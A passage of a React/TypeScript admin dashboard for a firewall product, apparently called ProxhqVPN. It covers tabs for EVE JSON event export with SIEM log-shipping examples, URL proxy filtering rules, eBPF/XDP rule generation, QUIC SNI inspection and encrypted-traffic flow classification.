                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
    </div>
  );
}

// ── 11. EVE JSON EXPORT ───────────────────────────────────────────────────────
function EveExportTab() {
  const { data, loading, reload } = useFw<{ events: Array<{timestamp:string;event_type:string;src_ip:string;alert?:{category:string;signature:string;severity:number};proxhq_source:string}>; total:number }>("/eve-export?limit=100");
  const [since, setSince] = useState("");

  const downloadNdjson = () => {
    const url = `${API}/eve-export/ndjson${since?`?since=${new Date(since).getTime()}`:""}`;
    window.open(url, "_blank");
  };

  const EVT_COLOR: Record<string,string> = { alert:"#ff4444", dns:"#4488ff", portscan:"#ff9900" };
  const SEV_LABEL: Record<number,string> = { 1:"Critical", 2:"High", 3:"Medium", 4:"Low", 5:"Info" };

  return (
    <div>
      <CardBox title="📄 EVE JSON Event Export (Suricata-Compatible Format)" action={
        <div style={{ display:"flex", gap:8, alignItems:"center" }}>
          <FwInput type="datetime-local" value={since} onChange={e=>setSince(e.target.value)} style={{ width:180 }} />
          <Btn onClick={downloadNdjson} color="#00ff88" sm><Download size={10}/> Download NDJSON</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          Exports all ProxhqVPN security events (WAF alerts, DNS detections, portscan events) in Suricata's EVE JSON format — the industry-standard structured event format. Compatible with Elasticsearch, Logstash, Splunk, Kibana (ELK), Grafana, and any SIEM that ingests Suricata logs. Download as NDJSON (one JSON object per line) for direct import.
        </p>
        <div style={{ display:"flex", gap:20, marginBottom:14 }}>
          <div style={{ textAlign:"center" }}>
            <div style={{ fontFamily:"monospace", fontSize:24, fontWeight:700, color:"#00ff88" }}>{data?.total ?? 0}</div>
            <div style={{ fontSize:10, color:"#555" }}>Total Events</div>
          </div>
          {data?.events && (
            <>
              <div style={{ textAlign:"center" }}>
                <div style={{ fontFamily:"monospace", fontSize:24, fontWeight:700, color:"#ff4444" }}>{data.events.filter(e=>e.event_type==="alert").length}</div>
                <div style={{ fontSize:10, color:"#555" }}>WAF Alerts</div>
              </div>
              <div style={{ textAlign:"center" }}>
                <div style={{ fontFamily:"monospace", fontSize:24, fontWeight:700, color:"#4488ff" }}>{data.events.filter(e=>e.event_type==="dns").length}</div>
                <div style={{ fontSize:10, color:"#555" }}>DNS Events</div>
              </div>
              <div style={{ textAlign:"center" }}>
                <div style={{ fontFamily:"monospace", fontSize:24, fontWeight:700, color:"#ff9900" }}>{data.events.filter(e=>e.event_type==="portscan").length}</div>
                <div style={{ fontSize:10, color:"#555" }}>Portscan Events</div>
              </div>
            </>
          )}
        </div>

        {/* Raw EVE sample */}
        {data?.events?.[0] && (
          <div style={{ background:"#050505", border:"1px solid #1a1a1a", borderRadius:6, padding:12, marginBottom:14 }}>
            <div style={{ fontFamily:"monospace", fontSize:10, color:"#333", marginBottom:4 }}>SAMPLE EVE JSON EVENT</div>
            <pre style={{ margin:0, fontSize:10, color:"#555", overflowX:"auto" }}>{JSON.stringify(data.events[0], null, 2)}</pre>
          </div>
        )}

        {loading ? <Spinner/> : (
          <div style={{ maxHeight:400, overflowY:"auto" }}>
            <table style={{ width:"100%", borderCollapse:"collapse" }}>
              <thead><tr><TH>Timestamp</TH><TH>Event Type</TH><TH>Source IP</TH><TH>Category</TH><TH>Signature</TH><TH>Severity</TH><TH>Source</TH></tr></thead>
              <tbody>
                {!data?.events?.length ? <EmptyRow cols={7} msg="No events yet. WAF, DNS monitor, and portscan events will appear here."/> : data.events.map((e,i)=>(
                  <tr key={i}>
                    <TD mono c="#444">{new Date(e.timestamp).toLocaleString()}</TD>
                    <TD><Bdg label={e.event_type} color={EVT_COLOR[e.event_type]??"#888"} sm/></TD>
                    <TD mono c="#ccc">{e.src_ip}</TD>
                    <TD mono c="#888">{e.alert?.category ?? "—"}</TD>
                    <TD c="#ccc">{e.alert?.signature?.substring(0,50) ?? "—"}{(e.alert?.signature?.length??0)>50?"…":""}</TD>
                    <TD mono c={e.alert?.severity===1?"#ff2244":e.alert?.severity===2?"#ff4444":e.alert?.severity===3?"#ff9900":"#888"}>{SEV_LABEL[e.alert?.severity??5] ?? "—"}</TD>
                    <TD mono c="#444">{e.proxhq_source}</TD>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </CardBox>
      <CardBox title="🔌 SIEM Integration Guide">
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:12 }}>
          <div style={{ background:"#111", borderRadius:6, padding:12 }}>
            <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#ff9900", marginBottom:8 }}>Elasticsearch / Kibana (ELK)</div>
            <pre style={{ margin:0, fontSize:10, color:"#555", overflowX:"auto" }}>{`# Filebeat input
filebeat.inputs:
  - type: log
    paths: [/var/log/proxhq-eve.json]
    json.keys_under_root: true
    json.add_error_key: true
output.elasticsearch:
  hosts: ["https://elk:9200"]
  index: "proxhq-events-%{+yyyy.MM}"

# Or pipe directly:
curl "${API}/eve-export/ndjson" | 
  curl -X POST elk:9200/_bulk`}</pre>
          </div>
          <div style={{ background:"#111", borderRadius:6, padding:12 }}>
            <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#4488ff", marginBottom:8 }}>Splunk Universal Forwarder</div>
            <pre style={{ margin:0, fontSize:10, color:"#555", overflowX:"auto" }}>{`# inputs.conf
[monitor:///var/log/proxhq-eve.json]
sourcetype = suricata:eve
index = proxhq_security

# Or via HTTP Event Collector:
curl "${API}/eve-export/ndjson" |
  while read line; do
    curl -s -X POST "https://splunk:8088/services/collector/event" \\
      -H "Authorization: Splunk $HEC_TOKEN" \\
      -d '{"event":'$line'}'
  done`}</pre>
          </div>
        </div>
      </CardBox>
    </div>
  );
}

// ── 12. WEB PROXY / CONTENT FILTER ───────────────────────────────────────────
function ProxyRulesTab() {
  const { data, loading, reload } = useFw<{ rules: Array<{id:number;name:string;matchType:string;matchValue:string;action:string;categories:string|null;priority:number;enabled:boolean;hitCount:number;description:string|null}> }>("/proxy-rules");
  const [form, setForm] = useState({ name:"", matchType:"domain", matchValue:"", action:"block", description:"", priority:"100" });
  const [checkUrl, setCheckUrl] = useState("");
  const [checkResult, setCheckResult] = useState<{matched:boolean;action:string;rule?:string}|null>(null);
  const [saving, setSaving] = useState(false);

  const ACTION_COLOR: Record<string,string> = { allow:"#00ff88", block:"#ff4444", redirect:"#ff9900", strip_ssl:"#cc44ff" };

  const save = async () => {
    if (!form.name || !form.matchValue) return;
    setSaving(true);
    await fwPost("/proxy-rules", { ...form, priority:parseInt(form.priority) });
    setForm({ name:"", matchType:"domain", matchValue:"", action:"block", description:"", priority:"100" });
    await reload(); setSaving(false);
  };
  const checkRule = async () => {
    if (!checkUrl) return;
    const res = await fwPost("/proxy-rules/check", { url: checkUrl });
    setCheckResult(res);
  };

  return (
    <div>
      <CardBox title="🔒 Web Proxy / URL Content Filter (IPFire/OPNsense/pfSense)" action={
        <div style={{ display:"flex", gap:8 }}>
          <Btn onClick={async()=>{await fwPost("/proxy-rules/seed",{}); await reload();}} color="#4488ff" sm>Seed Defaults</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          HTTP/HTTPS proxy-level content filtering. Block by domain, URL, regex pattern, MIME type, or category (ads, malware, adult, social). Identical to IPFire's Squid-based URL filter and OPNsense's built-in proxy. Check any URL against active rules in real-time.
        </p>
        <div style={{ display:"grid", gridTemplateColumns:"1.5fr 1fr 1fr 1fr 1fr 1fr auto", gap:6, marginBottom:12 }}>
          <FwInput placeholder="Rule name" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} />
          <FwSelect value={form.matchType} onChange={e=>setForm(f=>({...f,matchType:e.target.value}))}>
            <option value="domain">Domain</option>
            <option value="url">URL Prefix</option>
            <option value="regex">Regex Pattern</option>
            <option value="category">Category</option>
            <option value="mime">MIME Type</option>
          </FwSelect>
          <FwInput placeholder="Match value" value={form.matchValue} onChange={e=>setForm(f=>({...f,matchValue:e.target.value}))} />
          <FwSelect value={form.action} onChange={e=>setForm(f=>({...f,action:e.target.value}))}>
            <option value="block">Block</option>
            <option value="allow">Allow</option>
            <option value="redirect">Redirect</option>
            <option value="strip_ssl">Strip SSL</option>
          </FwSelect>
          <FwInput type="number" placeholder="Priority" value={form.priority} onChange={e=>setForm(f=>({...f,priority:e.target.value}))} />
          <FwInput placeholder="Description" value={form.description} onChange={e=>setForm(f=>({...f,description:e.target.value}))} />
          <Btn onClick={save} color="#00ff88">{saving?"Saving…":"+ Add"}</Btn>
        </div>

        {/* URL Checker */}
        <div style={{ background:"#111", borderRadius:6, padding:12, marginBottom:14 }}>
          <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#4488ff", marginBottom:8 }}>🔎 Check URL Against Rules</div>
          <div style={{ display:"flex", gap:8, alignItems:"center" }}>
            <FwInput placeholder="Enter URL to check (e.g. https://example.com/path)" value={checkUrl} onChange={e=>setCheckUrl(e.target.value)} style={{ width:380 }} />
            <Btn onClick={checkRule} color="#4488ff">Check</Btn>
            {checkResult && (
              <div style={{ display:"flex", gap:8, alignItems:"center" }}>
                <Bdg label={checkResult.matched?"MATCHED":"PASS"} color={checkResult.matched?ACTION_COLOR[checkResult.action]??"#ff9900":"#00ff88"} sm/>
                {checkResult.matched && <><Bdg label={checkResult.action.toUpperCase()} color={ACTION_COLOR[checkResult.action]??"#888"} sm/><span style={{ fontFamily:"monospace", fontSize:11, color:"#555" }}>Rule: {checkResult.rule}</span></>}
              </div>
            )}
          </div>
        </div>

        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Name</TH><TH>Match Type</TH><TH>Match Value</TH><TH>Action</TH><TH>Priority</TH><TH>Hits</TH><TH>Status</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.rules?.length ? <EmptyRow cols={8} msg="No proxy rules. Click 'Seed Defaults' to load basic filters (ads, malware, phishing)."/> : data.rules.map(r=>(
                <tr key={r.id}>
                  <TD c="#fff">{r.name}</TD>
                  <TD mono c="#888">{r.matchType}</TD>
                  <TD mono c="#ccc">{r.matchValue.substring(0,40)}{r.matchValue.length>40?"…":""}</TD>
                  <TD><Bdg label={r.action} color={ACTION_COLOR[r.action]??"#888"} sm/></TD>
                  <TD mono c="#666">{r.priority}</TD>
                  <TD mono c="#ff9900">{r.hitCount}</TD>
                  <TD><Bdg label={r.enabled?"ON":"OFF"} color={r.enabled?"#00ff88":"#444"} sm/></TD>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                    <div style={{ display:"flex", gap:4 }}>
                      <Btn onClick={async()=>{await fwPut(`/proxy-rules/${r.id}`,{enabled:!r.enabled}); await reload();}} color={r.enabled?"#ff9900":"#00ff88"} sm>{r.enabled?"Off":"On"}</Btn>
                      <Btn onClick={async()=>{await fwDelete(`/proxy-rules/${r.id}`); await reload();}} color="#ff4444" sm><Trash2 size={10}/></Btn>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════
// ── 2024-2025 NEXT-GEN FEATURES ─────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════════

const APIFWN = "/api/fwn";
async function fwnPost(path: string, body: unknown) {
  const r = await fetch(`${APIFWN}${path}`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) });
  return r.json();
}
async function fwnPut(path: string, body: unknown) {
  const r = await fetch(`${APIFWN}${path}`, { method:"PUT", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) });
  return r.json();
}
async function fwnDelete(path: string) {
  const r = await fetch(`${APIFWN}${path}`, { method:"DELETE" });
  return r.json();
}
function useFwn<T>(path: string) {
  const [data, setData] = useState<T|null>(null);
  const [loading, setLoading] = useState(true);
  const load = useCallback(async () => {
    setLoading(true);
    try { const r = await fetch(`${APIFWN}${path}`); setData(await r.json()); } catch {}
    setLoading(false);
  }, [path]);
  useEffect(() => { load(); }, [load]);
  return { data, loading, reload: load };
}

// ── N1. eBPF / XDP RULE ENGINE ────────────────────────────────────────────
function EbpfTab() {
  const { data, loading, reload } = useFwn<{ rules: Array<{id:number;name:string;programType:string;hook:string;iface:string;priority:number;action:string;matchSrcIp:string|null;matchDstIp:string|null;matchDstPort:number|null;matchProto:string|null;rateLimit:number|null;enabled:boolean;statsPackets:number;statsBytes:number;description:string|null}> }>("/ebpf/rules");
  const [form, setForm] = useState({ name:"", programType:"xdp", hook:"ingress", iface:"eth0", priority:"100", matchSrcIp:"", matchDstIp:"", matchDstPort:"", matchProto:"any", action:"drop", rateLimit:"" });
  const [selected, setSelected] = useState<number|null>(null);
  const [code, setCode] = useState<{cCode?:string;rustCode?:string;loadScript?:string}|null>(null);
  const [saving, setSaving] = useState(false);

  const PT_COLOR: Record<string,string> = { xdp:"#00ff88", tc:"#4488ff", cgroup_skb:"#ff9900", socket_filter:"#cc44ff" };
  const ACT_COLOR: Record<string,string> = { drop:"#ff4444", pass:"#00ff88", redirect:"#4488ff", tx:"#ff9900", log:"#888", rate_limit:"#ffaa00" };

  const save = async () => {
    if (!form.name) return; setSaving(true);
    await fwnPost("/ebpf/rules", { ...form, priority:parseInt(form.priority), matchDstPort:form.matchDstPort?parseInt(form.matchDstPort):undefined, rateLimit:form.rateLimit?parseInt(form.rateLimit):undefined });
    setForm({ name:"", programType:"xdp", hook:"ingress", iface:"eth0", priority:"100", matchSrcIp:"", matchDstIp:"", matchDstPort:"", matchProto:"any", action:"drop", rateLimit:"" });
    await reload(); setSaving(false);
  };

  const genCode = async (id: number, lang:"c"|"rust") => {
    const r = await fwnPost(`/ebpf/codegen/${id}`, { lang });
    setSelected(id); setCode(r);
  };

  return (
    <div>
      <CardBox title="⚡ eBPF / XDP Kernel-Bypass Rule Engine (2024-2025)" action={
        <div style={{display:"flex",gap:8}}>
          <Btn onClick={async()=>{await fwnPost("/ebpf/seed",{}); await reload();}} color="#4488ff" sm>Seed Defaults</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{margin:"0 0 12px",fontSize:11,color:"#555"}}>
          XDP programs attach at the NIC driver level — before the kernel network stack. Packets are processed at line-rate (100M+ pps on commodity hardware). Used in production by Cloudflare, Meta (Katran), Google, and Cilium. Supports XDP_DROP, XDP_PASS, XDP_TX, XDP_REDIRECT verdicts. Generate deployable eBPF C or Rust/Aya code for any rule.
        </p>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:8,marginBottom:14}}>
          {[["Name",<input key="n" placeholder="Block RFC1918" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}/>],
            ["Interface",<input key="if" placeholder="eth0" value={form.iface} onChange={e=>setForm(f=>({...f,iface:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}/>],
            ["Src IP/CIDR",<input key="si" placeholder="10.0.0.0/8" value={form.matchSrcIp} onChange={e=>setForm(f=>({...f,matchSrcIp:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}/>],
            ["Dst IP/CIDR",<input key="di" placeholder="any" value={form.matchDstIp} onChange={e=>setForm(f=>({...f,matchDstIp:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}/>],
            ["Dst Port",<input key="dp" placeholder="443" value={form.matchDstPort} onChange={e=>setForm(f=>({...f,matchDstPort:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}/>],
            ["Rate Limit (pps)",<input key="rl" placeholder="10000" value={form.rateLimit} onChange={e=>setForm(f=>({...f,rateLimit:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}/>],
          ].map(([label,el])=>(
            <div key={String(label)}><div style={{fontSize:10,color:"#555",marginBottom:2}}>{label}</div>{el}</div>
          ))}
          {[["Program Type",["xdp","tc","cgroup_skb","socket_filter"],form.programType,(v:string)=>setForm(f=>({...f,programType:v}))],
            ["Hook",["ingress","egress","both"],form.hook,(v:string)=>setForm(f=>({...f,hook:v}))],
            ["Protocol",["any","tcp","udp","icmp"],form.matchProto,(v:string)=>setForm(f=>({...f,matchProto:v}))],
            ["Action",["drop","pass","redirect","tx","log","rate_limit"],form.action,(v:string)=>setForm(f=>({...f,action:v}))],
          ].map(([label,opts,val,onChange])=>(
            <div key={String(label)}><div style={{fontSize:10,color:"#555",marginBottom:2}}>{String(label)}</div>
              <select value={String(val)} onChange={e=>(onChange as (v:string)=>void)(e.target.value)} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}>
                {(opts as string[]).map(o=><option key={o}>{o}</option>)}
              </select>
            </div>
          ))}
        </div>
        <Btn onClick={save} color="#00ff88" disabled={saving||!form.name} sm>{saving?"Saving...":"Add eBPF Rule"}</Btn>
      </CardBox>

      {loading && <div style={{color:"#555",fontSize:11,marginTop:8}}>Loading...</div>}
      {data?.rules && data.rules.length > 0 && (
        <CardBox title={`eBPF Rules (${data.rules.length})`}>
          <table style={{width:"100%",borderCollapse:"collapse",fontSize:11,fontFamily:"monospace"}}>
            <thead><tr>{["Priority","Name","Type","Interface","Match","Action","Packets",""].map(h=><TH key={h}>{h}</TH>)}</tr></thead>
            <tbody>
              {data.rules.map(r=>(
                <tr key={r.id} style={{borderBottom:"1px solid #111"}}>
                  <TD>{r.priority}</TD>
                  <TD><span style={{color:"#fff"}}>{r.name}</span></TD>
                  <TD><Bdg label={r.programType.toUpperCase()} color={PT_COLOR[r.programType]??"#888"} sm/></TD>
                  <TD style={{fontFamily:"monospace",color:"#aaa"}}>{r.iface}</TD>
                  <TD style={{color:"#555"}}>
                    {r.matchSrcIp && <span>src:{r.matchSrcIp} </span>}
                    {r.matchDstIp && <span>dst:{r.matchDstIp} </span>}
                    {r.matchDstPort && <span>:{r.matchDstPort} </span>}
                    {r.matchProto && r.matchProto !== "any" && <span>{r.matchProto.toUpperCase()}</span>}
                    {!r.matchSrcIp && !r.matchDstIp && !r.matchDstPort && <span style={{color:"#333"}}>any</span>}
                  </TD>
                  <TD><Bdg label={r.action.toUpperCase()} color={ACT_COLOR[r.action]??"#888"} sm/></TD>
                  <TD style={{color:"#666"}}>{r.statsPackets.toLocaleString()}</TD>
                  <TD>
                    <div style={{display:"flex",gap:4}}>
                      <Btn onClick={()=>genCode(r.id,"c")} color="#4488ff" sm>C</Btn>
                      <Btn onClick={()=>genCode(r.id,"rust")} color="#cc44ff" sm>Rust</Btn>
                      <Btn onClick={async()=>{await fwnPut(`/ebpf/rules/${r.id}`,{enabled:!r.enabled}); await reload();}} color={r.enabled?"#555":"#00ff88"} sm>{r.enabled?"Disable":"Enable"}</Btn>
                      <Btn onClick={async()=>{await fwnDelete(`/ebpf/rules/${r.id}`); await reload();}} color="#ff4444" sm><Trash2 size={9}/></Btn>
                    </div>
                  </TD>
                </tr>
              ))}
            </tbody>
          </table>
        </CardBox>
      )}

      {code && selected && (
        <CardBox title={`Generated eBPF Code — Rule #${selected}`}>
          <div style={{display:"flex",gap:8,marginBottom:10}}>
            <Btn onClick={()=>setCode(null)} color="#555" sm>Close</Btn>
          </div>
          {code.cCode && (
            <div>
              <div style={{fontSize:10,color:"#4488ff",marginBottom:4}}>C / libbpf / bpf2go (attach with ip-link xdpgeneric): <CopyBtn text={code.cCode??""}/></div>
              <pre style={{background:"#080808",border:"1px solid #1a1a1a",borderRadius:6,padding:12,fontSize:10,overflowX:"auto",color:"#aaa",maxHeight:300}}>{code.cCode}</pre>
            </div>
          )}
          {code.loadScript && (
            <div style={{marginTop:10}}>
              <div style={{fontSize:10,color:"#00ff88",marginBottom:4}}>Load Script: <CopyBtn text={code.loadScript??""}/></div>
              <pre style={{background:"#080808",border:"1px solid #1a1a1a",borderRadius:6,padding:12,fontSize:10,color:"#aaa",maxHeight:200}}>{code.loadScript}</pre>
            </div>
          )}
        </CardBox>
      )}
    </div>
  );
}

// ── N2. QUIC / HTTP3 INSPECTOR ────────────────────────────────────────────
function QuicTab() {
  const { data, loading, reload } = useFwn<{ events: Array<{id:number;srcIp:string;dstIp:string;dstPort:number;sni:string|null;quicVersion:string|null;echDetected:boolean;action:string;bytesIn:number;bytesOut:number;detectedAt:string}>; total:number; echCount:number }>("/quic/events");
  const { data: pol } = useFwn<{ defaultAction:string;blockUnknownSni:boolean;blockEch:boolean;quicVersions:string[];note:string }>("/quic/policy");
  const [inspectForm, setInspectForm] = useState({ srcIp:"10.0.0.1", dstIp:"1.1.1.1", dstPort:"443", sni:"" });
  const [inspectResult, setInspectResult] = useState<{extractedSni:string|null;quicVersion:string;echDetected:boolean;action:string;analysis:{sniExposed:boolean;threat:string|null;note:string}}|null>(null);
  const [loading2, setLoading2] = useState(false);

  const ACT_COLOR: Record<string,string> = { allow:"#00ff88", block:"#ff4444", log:"#888", throttle:"#ff9900" };

  const inspect = async () => {
    setLoading2(true);
    const r = await fwnPost("/quic/inspect", { ...inspectForm, dstPort:parseInt(inspectForm.dstPort) });
    setInspectResult(r);
    setLoading2(false);
    await reload();
  };

  return (
    <div>
      <CardBox title="⚡ QUIC / HTTP3 Inspector (2024-2025)" action={
        <div style={{display:"flex",gap:8}}>
          <Btn onClick={async()=>{await fwnPost("/quic/seed",{}); await reload();}} color="#4488ff" sm>Seed Events</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{margin:"0 0 12px",fontSize:11,color:"#555"}}>
          QUIC runs over UDP/443 and is used by 30%+ of web traffic (2024). QUIC Initial packets carry an unencrypted TLS ClientHello — the SNI field is extractable before the QUIC handshake completes. Firewall can allow/block by SNI without SSL termination. ECH (Encrypted Client Hello) hides the real SNI using a public outer_name only.
        </p>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr 1fr",gap:8,marginBottom:10}}>
          {[["Src IP","srcIp","10.0.0.1"],["Dst IP","dstIp","1.1.1.1"],["Dst Port","dstPort","443"],["SNI (known)","sni",""]].map(([label,k,ph])=>(
            <div key={k}><div style={{fontSize:10,color:"#555",marginBottom:2}}>{label}</div>
              <input placeholder={ph} value={(inspectForm as Record<string,string>)[k]} onChange={e=>setInspectForm(f=>({...f,[k]:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}/>
            </div>
          ))}
        </div>
        <Btn onClick={inspect} color="#00ff88" disabled={loading2} sm>{loading2?"Inspecting...":"Inspect QUIC Packet"}</Btn>
        {inspectResult && (
          <div style={{marginTop:12,padding:10,background:"#080808",border:"1px solid #1a1a1a",borderRadius:6}}>
            <div style={{display:"flex",gap:10,alignItems:"center",flexWrap:"wrap"}}>
              <Bdg label={inspectResult.action.toUpperCase()} color={ACT_COLOR[inspectResult.action]??"#888"} sm/>
              {inspectResult.echDetected && <Bdg label="ECH ACTIVE" color="#cc44ff" sm/>}
              {inspectResult.extractedSni && <span style={{color:"#fff",fontFamily:"monospace",fontSize:11}}>SNI: {inspectResult.extractedSni}</span>}
              <span style={{fontSize:10,color:"#555"}}>QUIC v{inspectResult.quicVersion}</span>
            </div>
            <p style={{margin:"8px 0 0",fontSize:10,color:inspectResult.analysis.threat?"#ff4444":"#555"}}>{inspectResult.analysis.threat ?? inspectResult.analysis.note}</p>
          </div>
        )}
        {pol && (
          <div style={{marginTop:12,padding:8,background:"#070708",border:"1px solid #1a1a1a",borderRadius:6,fontSize:10,color:"#555"}}>
            <span style={{color:"#aaa"}}>Policy:</span> Default {pol.defaultAction} · ECH block: {pol.blockEch?"YES":"no"} · Versions: {pol.quicVersions?.join(", ")}
          </div>
        )}
      </CardBox>
      {loading && <div style={{color:"#555",fontSize:11,marginTop:8}}>Loading...</div>}
      {data && (
        <CardBox title={`QUIC Events (${data.total}) · ECH detected: ${data.echCount}`}>
          <table style={{width:"100%",borderCollapse:"collapse",fontSize:11,fontFamily:"monospace"}}>
            <thead><tr>{["Src IP","Dst IP","Port","SNI","QUIC v","ECH","Action","↑ Bytes","Time"].map(h=><TH key={h}>{h}</TH>)}</tr></thead>
            <tbody>
              {data.events.map(e=>(
                <tr key={e.id} style={{borderBottom:"1px solid #111"}}>
                  <TD style={{color:"#aaa"}}>{e.srcIp}</TD>
                  <TD style={{color:"#aaa"}}>{e.dstIp}</TD>
                  <TD>{e.dstPort}</TD>
                  <TD style={{color:"#fff"}}>{e.sni ?? <span style={{color:"#333"}}>—</span>}</TD>
                  <TD style={{color:"#666"}}>v{e.quicVersion}</TD>
                  <TD>{e.echDetected ? <Bdg label="ECH" color="#cc44ff" sm/> : <span style={{color:"#333"}}>—</span>}</TD>
                  <TD><Bdg label={e.action.toUpperCase()} color={ACT_COLOR[e.action]??"#888"} sm/></TD>
                  <TD style={{color:"#666"}}>{(e.bytesOut/1024).toFixed(1)}KB</TD>
                  <TD style={{color:"#555",fontSize:10}}>{new Date(e.detectedAt).toLocaleTimeString()}</TD>
                </tr>
              ))}
            </tbody>
          </table>
        </CardBox>
      )}
    </div>
  );
}

// ── N3. ENCRYPTED TRAFFIC ANALYZER (ETA) ──────────────────────────────────
function EtaTab() {
  const { data, loading, reload } = useFwn<{ flows: Array<{id:number;srcIp:string;dstIp:string;dstPort:number|null;protocol:string;packetCount:number;byteCount:number;byteEntropy:number|null;iatMeanMs:number|null;classification:string;confidencePct:number|null;action:string;flowStart:string}>;total:number;malicious:number }>("/eta/flows");
  const [form, setForm] = useState({ srcIp:"10.0.0.1", dstIp:"45.33.32.156", dstPort:"8080", protocol:"tcp", packetCount:"12", byteCount:"2400", avgPacketSize:"200", byteEntropy:"6.8", iatMeanMs:"30000", iatStdMs:"15" });
  const [classResult, setClassResult] = useState<{classification:string;confidence:number;reason:string;threat:string|null;features:Record<string,number>}|null>(null);
  const [classifying, setClassifying] = useState(false);

  const CLASS_COLOR: Record<string,string> = { streaming:"#4488ff",vpn:"#cc44ff",c2_beacon:"#ff2244",malware:"#ff2244",browsing:"#00ff88",voip:"#00ccff",gaming:"#ff9900",p2p:"#ffaa00",encrypted_dns:"#888",unknown:"#555" };

  const classify = async () => {
    setClassifying(true);
    const r = await fwnPost("/eta/classify", Object.fromEntries(Object.entries(form).map(([k,v])=>[k,parseFloat(v)||0])));
    setClassResult(r); await reload(); setClassifying(false);
  };

  return (
    <div>
      <CardBox title="🔬 Encrypted Traffic Analyzer — ML Fingerprinting Without Decryption (2024-2025)" action={
        <div style={{display:"flex",gap:8}}>
          <Btn onClick={async()=>{await fwnPost("/eta/seed",{}); await reload();}} color="#4488ff" sm>Seed Flows</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{margin:"0 0 12px",fontSize:11,color:"#555"}}>
          Classifies encrypted traffic without decryption using flow-level features: packet size distribution, inter-arrival times (IAT), byte entropy, burst patterns. Based on CICFlowMeter / NetML-2020 / ISCX-2012 research. Detects C2 beaconing, malware exfil, VPN, streaming, VoIP, gaming, P2P from TLS+QUIC metadata alone.
        </p>
        <div style={{display:"grid",gridTemplateColumns:"repeat(5,1fr)",gap:6,marginBottom:10}}>
          {[["Src IP","srcIp"],["Dst IP","dstIp"],["Port","dstPort"],["Protocol","protocol"],["Packets","packetCount"],["Bytes","byteCount"],["Avg Pkt","avgPacketSize"],["Entropy 0-8","byteEntropy"],["IAT mean (ms)","iatMeanMs"],["IAT std (ms)","iatStdMs"]].map(([label,k])=>(
            <div key={k}><div style={{fontSize:10,color:"#555",marginBottom:2}}>{label}</div>
              <input value={(form as Record<string,string>)[k]} onChange={e=>setForm(f=>({...f,[k]:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 6px",borderRadius:4,fontSize:11,width:"100%"}}/>
            </div>
          ))}
        </div>
        <Btn onClick={classify} color="#00ff88" disabled={classifying} sm>{classifying?"Classifying...":"Classify Flow"}</Btn>
        {classResult && (
          <div style={{marginTop:12,padding:10,background:"#080808",border:"1px solid #1a1a1a",borderRadius:6}}>
            <div style={{display:"flex",gap:10,alignItems:"center"}}>
              <Bdg label={classResult.classification.replace("_"," ").toUpperCase()} color={CLASS_COLOR[classResult.classification]??"#888"} sm/>
              <span style={{fontSize:11,color:"#aaa"}}>Confidence: <b style={{color:"#fff"}}>{classResult.confidence}%</b></span>
              {classResult.threat && <Bdg label="THREAT" color="#ff4444" sm/>}
            </div>
            <p style={{margin:"6px 0 0",fontSize:10,color:"#555"}}>{classResult.reason}</p>
            {classResult.threat && <p style={{margin:"4px 0 0",fontSize:10,color:"#ff4444"}}>{classResult.threat}</p>}
            <div style={{display:"flex",gap:12,marginTop:8,flexWrap:"wrap"}}>
              {Object.entries(classResult.features).map(([k,v])=>(
                <span key={k} style={{fontSize:10,color:"#555"}}><span style={{color:"#666"}}>{k}:</span> {typeof v === "number" ? v.toFixed(1) : v}</span>
              ))}
            </div>
          </div>
        )}
      </CardBox>
      {loading && <div style={{color:"#555",fontSize:11,marginTop:8}}>Loading...</div>}
      {data && (
        <CardBox title={`Traffic Flows (${data.total}) · Malicious: ${data.malicious}`}>
